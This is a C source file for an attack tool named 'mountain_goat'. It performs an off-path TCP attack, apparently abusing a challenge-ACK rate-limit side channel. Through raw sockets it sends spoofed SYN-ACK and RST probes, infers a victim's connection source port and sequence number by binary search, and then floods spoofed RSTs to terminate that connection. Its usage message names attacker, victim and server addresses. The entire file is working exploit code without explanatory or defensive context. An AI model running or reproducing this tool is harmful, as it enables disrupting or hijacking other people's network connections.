#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>
#include "layers.h"
#include <string.h>
#include <net/ethernet.h>
#include <time.h>
#include <sys/timerfd.h>
typedef struct state (*state_function)(Session *ctx);

struct state {
	state_function next;
};

void enter_the_machine(Session *ctx, state_function entry_point) {
	struct state s = {next:entry_point};
	while (1) {
		s = s.next(ctx);
	}
		
}

struct state state_error(Session *ctx) {
	fprintf(stderr, "Triggered error_state\n");
	exit(EXIT_FAILURE);
}

struct state state_finish(Session *ctx) {
	fprintf(stderr, "The Machine finished\n");
	exit(EXIT_SUCCESS);
}


#define PROBE_BUFF_LEN 60
unsigned count_acks_for_2secs(Session *ctx) {
	int response_count = 0;
	int start = time(NULL);
	while (time(NULL)-start <= 1) {
		struct tcp_header *h = session_read_packet(ctx);
		if (h == NULL)
			continue;

		ctx->stream_seq = tcp_get_acknum(h);
		ctx->stream_acks = tcp_get_seqnum(h);

		if (tcp_isset_fin(h)) {
			ctx->connection_closed = 1;
		}


		if (tcp_isset_ack(h) && !tcp_isset_fin(h) && ctx->stream_seq == tcp_get_acknum(h)) {
			response_count += 1;
		}	

		free(h);
	}
	return response_count;
}


void  tsync_to_offset(long nsec_offset) {
	struct timespec tsync;
	uint64_t exp;

	clock_gettime(CLOCK_REALTIME, &tsync);
	struct timespec initial1 = {tv_sec:tsync.tv_sec+1, tv_nsec:nsec_offset};
	struct timespec interv1 = {tv_sec:1, tv_nsec:0};
	const struct itimerspec itimer1 = {it_value:initial1,it_interval:interv1};
	int timer_fd = timerfd_create(CLOCK_REALTIME, 0);

	timerfd_settime(timer_fd,TFD_TIMER_ABSTIME, &itimer1, NULL);

	read(timer_fd, &exp, sizeof(uint64_t));
	close(timer_fd);
}


void probe_ack_spoof(Session *ctx, unsigned probe_count, uint32_t sequence) {
	char buffer[PROBE_BUFF_LEN];
	struct ipv4_header *ip = (struct ipv4_header *) buffer;
	struct tcp_header *tcp = (struct tcp_header *) (buffer + sizeof(struct ipv4_header));

	memset(buffer, 0, PROBE_BUFF_LEN);

	ipv4_spoof_init(ip, ctx);
	ip->len = sizeof(struct ipv4_header) + sizeof(struct tcp_header);

	tcp_spoof_init(tcp, ctx);
	tcp_set_seqnum(tcp, sequence);
	tcp_set_rst(tcp);
	tcp_calculate_checksum(ip, tcp);
	
	for(unsigned count = 0; count < probe_count; count++) {
		int bytes_sent = sendto(ctx->raw_socket, buffer, ip->len, 0, ctx->daddr->ai_addr, ctx->daddr->ai_addrlen);
		if (bytes_sent < 0 ) {
			perror("sendto() error");
			exit(-1);
		}
		usleep(1);
	}

}

void probe_ack_burst(Session *ctx, unsigned probe_count) {
	char buffer[PROBE_BUFF_LEN];
	struct ipv4_header *ip = (struct ipv4_header *) buffer;
	struct tcp_header *tcp = (struct tcp_header *) (buffer + sizeof(struct ipv4_header));

	memset(buffer, 0, PROBE_BUFF_LEN);

	ipv4_init(ip, ctx);
	ip->len = sizeof(struct ipv4_header) + sizeof(struct tcp_header);

	tcp_init(tcp, ctx);
	tcp_set_seqnum(tcp, ctx->stream_seq+1000);
	tcp_set_rst(tcp);
	tcp_calculate_checksum(ip, tcp);
	
	for(unsigned count = 0; count < probe_count; count++) {
		int bytes_sent = sendto(ctx->raw_socket, buffer, ip->len, 0, ctx->daddr->ai_addr, ctx->daddr->ai_addrlen);
		if (bytes_sent < 0 ) {
			perror("sendto() error");
			exit(-1);
		}
		usleep(1000);
	}
}


long probe_ack_interval(Session *ctx, const unsigned probe_count, const long probe_usec_cost, const long usec_interval) {
	struct timespec tstart, tend;

	char buffer[PROBE_BUFF_LEN];
	struct ipv4_header *ip = (struct ipv4_header *) buffer;
	struct tcp_header *tcp = (struct tcp_header *) (buffer + sizeof(struct ipv4_header));

	memset(buffer, 0, PROBE_BUFF_LEN);

	ipv4_init(ip, ctx);
	ip->len = sizeof(struct ipv4_header) + sizeof(struct tcp_header);

	tcp_init(tcp, ctx);
	tcp_set_seqnum(tcp, ctx->stream_seq+1000);
	tcp_set_rst(tcp);
	tcp_calculate_checksum(ip, tcp);

	
	tsync_to_offset(ctx->nsec_offset);

	clock_gettime(CLOCK_REALTIME, &tstart);
	for(unsigned count = 0; count < probe_count; count++) {
		int bytes_sent = sendto(ctx->raw_socket, buffer, ip->len, 0, ctx->daddr->ai_addr, ctx->daddr->ai_addrlen);
		if (bytes_sent < 0 ) {
			perror("sendto() error");
			exit(-1);
		}
		usleep((usec_interval-(probe_count*probe_usec_cost))/probe_count);
	}

	clock_gettime(CLOCK_REALTIME, &tend);
	printf("%u probes dispatch in %.5f seconds\n", probe_count,
           ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
           ((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));

	return tstart.tv_nsec;
}


void probe_syn_ack_port_interval(Session *ctx, uint16_t start, uint16_t end) {
	struct timespec tstart, tend;
	char buffer[PROBE_BUFF_LEN];
	struct ipv4_header *ip = (struct ipv4_header *) buffer;
	struct tcp_header *tcp = (struct tcp_header *) (buffer + sizeof(struct ipv4_header));

	memset(buffer, 0, PROBE_BUFF_LEN);

	ipv4_spoof_init(ip, ctx);
	ip->len = sizeof(struct ipv4_header) + sizeof(struct tcp_header);

	tcp_spoof_init(tcp, ctx);
	tcp_set_seqnum(tcp, ctx->stream_seq-100); //could be random
	tcp_set_syn(tcp);
	tcp_set_ack(tcp);

	tsync_to_offset(ctx->nsec_offset);
	clock_gettime(CLOCK_REALTIME, &tstart);
	for(int i = start; i <= end; i++) {
		tcp->srcport = htons(i);
		tcp_calculate_checksum(ip, tcp);

		int bytes_sent = sendto(ctx->raw_socket, buffer, ip->len, 0, ctx->daddr->ai_addr, ctx->daddr->ai_addrlen);
		if (bytes_sent < 0 ) {
			perror("proby_syn_ack_port_interval sendto() failed");
			exit(-1);
		}
		usleep(5);
	}
	clock_gettime(CLOCK_REALTIME, &tend);
	printf("%u syn+ack probes in %.5f seconds\n", end-start+1,
           ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
           ((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));

}


int probe_syn_ack_binary_search(Session *ctx, uint16_t left, uint16_t right) {
	uint32_t mid;
	while (left < right) {
		mid = (((uint32_t)right+(uint32_t)left)/2)+1*(((uint32_t)right+(uint32_t)left) % 2);
		probe_syn_ack_port_interval(ctx, mid, right);
		probe_ack_burst(ctx, 100);
	
		int count = count_acks_for_2secs(ctx);
		if(ctx->connection_closed) {
			session_reconnect_increase(ctx);
			continue;
		}

		if (count == 100) {
			right = mid-1;
		} else {
			left = mid;
		}
	}

	return left;
}

uint32_t probe_seq_binary_search(Session *ctx, uint32_t left, uint32_t right, uint32_t step) {
	uint32_t base = left;
	right = (right-left)/step;
	left = 1;
	uint64_t mid;
	while (left < right) {
		mid = ((right+left)/2)+1*((right+left) % 2);
		tsync_to_offset(ctx->nsec_offset);
		for(int j = mid; j <= right ; j++) {
			probe_ack_spoof(ctx, 1, base+j*step);
		}
		probe_ack_burst(ctx, 100);

		int count = count_acks_for_2secs(ctx);
		if(ctx->connection_closed) {
			session_reconnect_increase(ctx);
			continue;
		}

		if (count == 100) {
			right = mid-1;
		} else {
			left = mid;
		}

	}

	return base+left*step;
}


struct state state_having_a_blast(Session *ctx) {
printf("[ENTERING] state_having_a_blast\n");
	struct state s ={next:state_error};
	printf("Blasting RSTs: %u - %u\n", ctx->sequence_in_window-ctx->window_size, ctx->sequence_in_window);
	for(int i = ctx->sequence_in_window-ctx->step; i < ctx->sequence_in_window; i++) {
		probe_ack_spoof(ctx, 1, i);
	}
	
	tsync_to_offset(ctx->nsec_offset);
	probe_ack_spoof(ctx, 1, ctx->sequence_in_window);
	probe_ack_burst(ctx, 100);
	int count = count_acks_for_2secs(ctx);
	
	if(ctx->connection_closed) {
		session_reconnect_increase(ctx);
		s.next = state_having_a_blast;
		return s;
	}

	if(count == 100) {
		printf("Connection terminated, baaaah\n");
	} else {
		printf("Connection still alive, received %u ACKs\n", count);
	}

	exit(EXIT_SUCCESS);
}

struct state state_sequence_bin_search(Session *ctx) {
printf("[ENTERING] state_sequence_bin_search\n");
	struct state s = {next:state_having_a_blast};
	ctx->sequence_in_window = probe_seq_binary_search(ctx, ctx->sequence_chunk_start, ctx->sequence_chunk_end, ctx->step);

	printf("Sequence in targets window: %u\n", ctx->sequence_in_window);
	return s;
}

struct state state_sequence_chunk_inference(Session *ctx) {
printf("[ENTERING] state_sequence_chunk_inference\n");
	struct state s = {next:state_error};
	struct timespec tstart, tend;
	uint32_t chunksize = 4294967295/(ctx->window_size);
	
	uint32_t megachunks = chunksize/10000;

	for(int i = ctx->sequence_i; i < megachunks; i++) {
		printf("Probing Sequence Chunk %u - %u\n", (i*10000)*ctx->window_size, (i+1)*10000*ctx->window_size);
		ctx->sequence_i = i;
		tsync_to_offset(ctx->nsec_offset);
		clock_gettime(CLOCK_REALTIME, &tstart);
		for(int j = 0; j < 10000; j++) {
			probe_ack_spoof(ctx, 1, (i*10000*ctx->window_size) + j*ctx->window_size);
		}
		clock_gettime(CLOCK_REALTIME, &tend);
		probe_ack_burst(ctx, 100);

		if ( ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - ((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec) > 0.999) {
		printf("[!] %u probes dispatched in %.5f seconds\n", 10000+100,
        	   ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
           		((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));
		}

		int count = count_acks_for_2secs(ctx);
		if(ctx->connection_closed) {
			session_reconnect_increase(ctx);
			i -= 1;
			continue;
		}

		if (count < 100) {
			printf("Sequence is in Chunk %u - %u\n", i*10000*ctx->window_size, (i+1)*10000*ctx->window_size);
			ctx->sequence_chunk_start = i*10000*ctx->window_size;
			ctx->sequence_chunk_end = (i+1)*10000*ctx->window_size;
			ctx->step = ctx->window_size*(100-count);

			if (ctx->step != ctx->window_size) {
				printf("Adjusted step from %u to %u\n", ctx->window_size, ctx->step);
			}

			s.next = state_sequence_bin_search;
			break;
		}
	}	

	return s;
}

struct state state_source_port_inference(Session *ctx) {
printf("[ENTERING] state_source_port_inference\n");
	struct state s = {next:state_error};
	//Windows prior Windows 2008: 1025  to  5000
	//Windows current:            49152 to 65535
	//Linux default:              32768 to 61000
	/*
		We have to split the ports into chunks because
		probe_syn_ack_port_interval has a small intervall between 
		sends, otherwise packets will disappear
	*/
	int i;
	int start = 32768;
	int end   = 61000;
	int chunksize = 10000;
	int chunks = (end-start)/chunksize;
	int rest = (end-start) % chunksize;

	for(i = 0; i < chunks; i++) {
		probe_syn_ack_port_interval(ctx, start+(i*chunksize), start+(i*chunksize)+chunksize);
		probe_ack_burst(ctx, 100);
		int count = count_acks_for_2secs(ctx);

		if(ctx->connection_closed) {
			session_reconnect_increase(ctx);
			i -= 1;
			continue;
		}

		if (count < 100) {
			uint16_t port = probe_syn_ack_binary_search(ctx, start+(i*chunksize), start+(i*chunksize)+chunksize);
			printf("Source Port interference determined: %u\n", port);
			session_set_source_port(ctx, port);
			s.next = state_sequence_chunk_inference;
			return s;
		}
	}

	if (rest != 0) {
		probe_syn_ack_port_interval(ctx, start+(i*chunksize), start+(i*chunksize)+rest);
		probe_ack_burst(ctx, 100);
		int count = count_acks_for_2secs(ctx);

		if(ctx->connection_closed) {
			session_reconnect_increase(ctx);
			probe_syn_ack_port_interval(ctx, start+(i*chunksize), start+(i*chunksize)+rest);
			probe_ack_burst(ctx, 100);
			count = count_acks_for_2secs(ctx);
			if (ctx->connection_closed){
				printf("Nope\n");
				exit(EXIT_FAILURE);
			}
		}

		if (count < 100) {
			uint16_t port = probe_syn_ack_binary_search(ctx, start+(i*chunksize), start+(i*chunksize)+rest);
			printf("Source Port interference determined: %u\n", port);
			session_set_source_port(ctx, port);
			s.next = state_sequence_chunk_inference;
			return s;
		}
	}

	printf("Source Port interference failed\n");
	exit(EXIT_FAILURE);
}	

struct state state_synchronize(Session *ctx) {
	printf("[ENTERING] state_synchronize\n");
	struct state s = {next:state_synchronize};

	long n1_offset = probe_ack_interval(ctx, 200, 200, 1000000);
	int n1 = count_acks_for_2secs(ctx);

	if (n1 == 0 ) {
		printf("[!] Server does not react on ACK probes.\n");
		exit(EXIT_FAILURE);
	}

	if (n1 < 100) {
		printf("Received less than 100 ACKs: %u\n");
		exit(EXIT_FAILURE);
	}

	if(ctx->connection_closed) {
		session_reconnect_increase(ctx);
		return s;
	}

	if (n1 == 100)
		goto synced;

	//Now we wait until we reach nanosec offset + 5 milliseconds
	ctx->nsec_offset = n1_offset + 5000000;

	long n2_offset = probe_ack_interval(ctx, 200, 200, 1000000);
	int n2 = count_acks_for_2secs(ctx);

	if(ctx->connection_closed) {
		session_reconnect_increase(ctx);
		return s;
	}

	if (n2 == 100)
		goto synced;

	uint64_t offset;
	if (n2 >= n1) {
		offset = (300-n2)*5000000;
	} else {
		offset = (n2-100)*5000000; 
	}

	//Now we wait until we reach nanosec offset + calculated offset
	ctx->nsec_offset = offset;
	probe_ack_interval(ctx, 200, 200, 1000000);
	int count = count_acks_for_2secs(ctx);

	if(ctx->connection_closed) {
		session_reconnect_increase(ctx);
		return s;
	}


	if (count != 100) {
		s.next = state_synchronize;
		return s;
	}

synced:
	if (ctx->sequence_in_window != 0)
		s.next = state_having_a_blast;

	if (ctx->sequence_chunk_start != 0 && ctx->sequence_chunk_end != 0) 
		s.next = state_sequence_bin_search;

	if (ctx->sequence_i != 0) 
		s.next = state_sequence_chunk_inference;


	if (session_get_source_port(ctx) == 0)
		s.next = state_source_port_inference;


	return s;
}

 
int main(int argc, char *argv[]) {

	if (argc != 6){
		printf("Usage: mountain_goat <attacker_ip> <attacker_port> <victim_ip> <server_ip> <server_port>\n");
		printf("\t(attacker_ip, attacker_port) - local pair that is used to connect to the server\n");
		exit(EXIT_FAILURE);
	}

	Session *ctx = new_session(argv[1], atoi(argv[2]), argv[3], argv[4], atoi(argv[5]));
	enter_the_machine(ctx, state_synchronize);

	return 0;
}
